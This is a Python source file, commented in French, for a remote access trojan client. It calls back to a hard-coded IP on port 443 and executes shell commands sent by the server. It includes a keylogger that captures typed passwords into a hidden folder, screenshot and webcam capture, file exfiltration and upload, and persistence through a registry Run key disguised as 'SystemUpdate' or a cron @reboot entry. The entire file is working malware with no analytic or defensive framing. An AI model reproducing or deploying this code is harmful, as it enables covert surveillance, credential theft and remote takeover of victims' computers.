#!/usr/bin/python3

import socket
import subprocess
import time
import os
import sys
import shutil
import platform
import json
import threading
import cv2
import io
import keyboard
import pyautogui
import winreg as reg

time_interval = 10
text = ""

# Configuration de l'environnement selon l'OS
""" if platform.system() == "Windows": """
hidden_folder = os.path.join(os.getenv('APPDATA'), "SecretFolder", "keystrokes")
""" else:
    hidden_folder = os.path.join(os.path.expanduser('~/.config'), "SecretFolder", "keystrokes") """
    
os.makedirs(hidden_folder, exist_ok=True)  # Créer le répertoire caché s'il n'existe pas

# Fichier de touches
keystroke_file_path = os.path.join(hidden_folder, "keystrokes.txt")

# Variable pour suivre l'état de l'enregistrement
is_recording = False

#la fonction qui vas envoyer la resultat des commande executer 
def sending(command):
    try:
        json_data = json.dumps(command)
        s.send(json_data.encode())
    except Exception as e:
        print(f"Error sending data: {e}")

#la fonction qui vas recever les commande a executer 
def receive():
    json_data = ""
    while True:
        try:
            chunk = s.recv(4096).decode()
            if not chunk:
                break
            json_data += chunk
            return json.loads(json_data)
        except json.JSONDecodeError:
            continue
        except Exception:
            print(f"Error receiving data: {s}")
            break

#la fonction qui vas etablire la connectiviter
def connection():
    global s
    while True:
        time.sleep(20)
        try:
            s.connect(("192.168.1.34", 443))
            shell()
            break  # Exit loop after successful shell session
        except socket.error as e:
            print(f"Connection error: {e}")
            continue  # Retry after sleep interval

def record_keystrokes():
    global is_recording
    try:
        with open(keystroke_file_path, 'a') as data_file:
            data_file.write(f"Started recording at {time.ctime()}\n")
            while is_recording:
                # Enregistrer les touches en continu
                events = keyboard.record('enter')  # Enregistrer jusqu'à "enter"
                password = list(keyboard.get_typed_strings(events))
                if password:
                    data_file.write(password[0])  # Sauvegarder les touches dans le fichier
                    data_file.write('\n')  # Ajouter une nouvelle ligne après chaque entrée
                time.sleep(0.1)  # Petite pause pour ne pas surcharger la CPU
    except Exception as e:
        print(f"Error while recording keystrokes: {str(e)}")
        

# Fonction pour démarrer l'enregistrement
def start_keylogger():
    global is_recording
    # Réinitialiser le fichier de frappes au début
    try:
        with open(keystroke_file_path, 'w') as data_file:
            data_file.write("")  # Vider le contenu
    except Exception as e:
        print(f"Error resetting keystroke file: {str(e)}")
    
    is_recording = True
    threading.Thread(target=record_keystrokes, daemon=True).start()


# Fonction pour arrêter l'enregistrement
def stop_keylogger():
    global is_recording
    is_recording = False  
    
def send_keystrokes_file():
    try:
        with open(keystroke_file_path, 'rb') as file:
            file_data = file.read().hex()  # Convertir le fichier en hexadécimal pour l'envoyer   
        sending({"status": "success", "data": file_data})
    except Exception as e:
        sending({"status": "error", "message": str(e)})    
    
def add_persistence():
    # Récupérer le chemin actuel de l'exécutable en cours d'exécution
    script_path = sys.argv[0]  # Cela retourne le chemin de l'exécutable (client.exe)

    try:
        if platform.system() == "Windows":
            # Ouvrir ou créer la clé de registre HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
            registry_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            app_name = "SystemUpdate"  # Nom visible dans le registre pour camoufler l'exécutable

            # Vérifier si la persistance existe déjà
            with reg.OpenKey(reg.HKEY_CURRENT_USER, registry_key_path, 0, reg.KEY_SET_VALUE) as reg_key:
                reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, f'"{script_path}"')
            
            return f"Persistance ajoutée avec succès pour : {script_path}"
        
        else:
            # Ajouter une tâche cron pour Linux (si nécessaire)
            cron_job = f"@reboot {script_path}\n"
            cron_file_path = os.path.expanduser("~/.crontab")
            with open(cron_file_path, "a") as cron_file:
                cron_file.write(cron_job)
            
            return f"Persistance ajoutée avec succès pour : {script_path} dans la crontab"

    except Exception as e:
        return f"Erreur lors de la configuration de la persistance : {str(e)}"

        
def shell():
    while True:
        try:
            command = receive()
            if command is None:
                print("Connection closed by the server.")
                break
            
                #taritemment de la commande quiter le shell
            if command.lower() in ["exit", "quit"]:
                print("Command received to end connection.")
                break
            
                #taritemment de la commande changer l'emplacemment
            elif command.startswith("cd "):  # Gérer la commande 'cd'
                try:
                    os.chdir(command[3:])
                    # Envoyer le nouveau répertoire au serveur
                    sending(f"Changed directory to {os.getcwd()}")
                except FileNotFoundError:
                    sending("Directory not found.")
                except Exception as e:
                    sending(f"Error changing directory: {str(e)}")
                continue
            
                #afficher l'emplacemment 
            elif command.strip() == "cd":  # Si l'utilisateur veut vérifier le répertoire
                sending(os.getcwd())
                continue
            
            #traitemment de la commande capture 
            elif command.strip() == "screenshot":
                try:
                    print("Attempting to capture screenshot...")  # Debug message
                    screenshot = pyautogui.screenshot()
                    buffer = io.BytesIO()
                    screenshot.save(buffer, format="PNG")
                    buffer.seek(0)
                    sending({"status": "success", "data": buffer.getvalue().hex()})
                    print("Screenshot captured and sent successfully.")  # Debug message
                except Exception as e:
                    print(f"Screenshot capture error: {str(e)}")  # Debug message
                    sending({"status": "error", "message": str(e)})
                continue

                
              #traitemment de la commande dowload  
            elif command.startswith("download "):
                try:
                    filepath = command[9:].strip()
                    with open(filepath, "rb") as f:
                        sending({"status": "success", "data": f.read().hex()})
                except FileNotFoundError:
                    sending({"status": "error", "message": "File not found"})
                except Exception as e:
                    sending({"status": "error", "message": str(e)})
                continue
            
            #traitemment de la commande upload
            
            
            elif command.startswith("upload "):
                try:
                    # Extraire le nom du fichier et les données
                    parts = command.split(" ", 2)
                    
                    if len(parts) < 3:
                        sending("Error: Invalid upload command format.")
                        continue
                    
                    filepath = parts[1]
                    filedata = parts[2]

                    # Récupérer le chemin du bureau de l'utilisateur
                    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

                    # Nom de fichier seulement (sans le chemin d'origine)
                    filename = os.path.basename(filepath)

                    # Chemin complet du fichier sur le bureau
                    target_path = os.path.join(desktop_path, filename)

                    # Écrire les données dans le fichier
                    with open(target_path, "wb") as f:
                        f.write(bytes.fromhex(filedata))

                    sending(f"File {filename} uploaded successfully to Desktop.")
                except Exception as e:
                    sending(f"Error uploading file: {str(e)}")
                continue
            
            elif command.strip() == "camera":
                try:
                    # Ouvrir la caméra
                    capture = cv2.VideoCapture(0)
                    if not capture.isOpened():
                        sending("Error: Could not access the camera.")
                        continue

                    # Capturer une seule image
                    ret, frame = capture.read()
                    if not ret or frame is None:
                        sending("Error: Could not capture an image from the camera.")
                        capture.release()
                        continue
                    
                    
                    
        # Encoder l'image en format PNG et convertir en hexadécimal
                    success, buffer = cv2.imencode(".png", frame)
                    if not success:
                        sending("Error: Could not encode the image.")
                        capture.release()
                        continue
                    
                    
                    image_data = buffer.tobytes().hex()

        # Envoyer l'image encodée au serveur
                    sending({"status": "success", "data": image_data})
                    capture.release()
                except Exception as e:
                    sending(f"Error: {str(e)}")
                finally:
                    capture.release()
                    cv2.destroyAllWindows()
                continue
            
            elif command.strip() == "keylogger start":
                # Démarrer l'enregistrement des touches
                start_keylogger()
                sending("Keystroke recording started.")
                continue

            elif command.strip() == "keylogger stop":
                # Arrêter l'enregistrement et envoyer le fichier
                stop_keylogger()
                time.sleep(1)
                send_keystrokes_file()
                
                continue
            
            elif command.strip() == "persistance":
                # Appeler la fonction pour ajouter le script au registre
                response = add_persistence()
                sending(response)  # Envoyer la réponse au serveur
                continue
        
            # Exécuter toutes les autres commandes
            proc = subprocess.Popen(
                command, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
            )
            result = proc.stdout.read() + proc.stderr.read()
            sending(result.decode('utf-8', errors='replace'))

        except socket.error as e:
            print(f"Socket error: {e}")
            break
        except Exception as e:
            print(f"General error: {e}")
            sending(f"Error: {str(e)}")

    print("Exiting shell...")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connection()
finally:
    s.close()